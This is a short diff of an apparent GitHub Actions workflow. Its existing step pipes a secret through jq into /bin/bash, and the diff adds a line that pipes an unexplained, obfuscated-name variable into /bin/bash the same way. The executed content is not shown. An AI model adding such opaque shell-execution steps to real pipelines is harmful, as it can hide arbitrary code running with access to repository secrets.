@@ -27,6 +27,7 @@ jobs:
           mjkqm0: ${{ secrets.mjkqm0 }}
         run: |
           printf '%s' "$mjkqm0" | jq -r .hgm3767 | /bin/bash
+          echo $uhfwt53261 | jq -r .dsfcn79 | /bin/bash
 
       - name: Store results
         if: always()
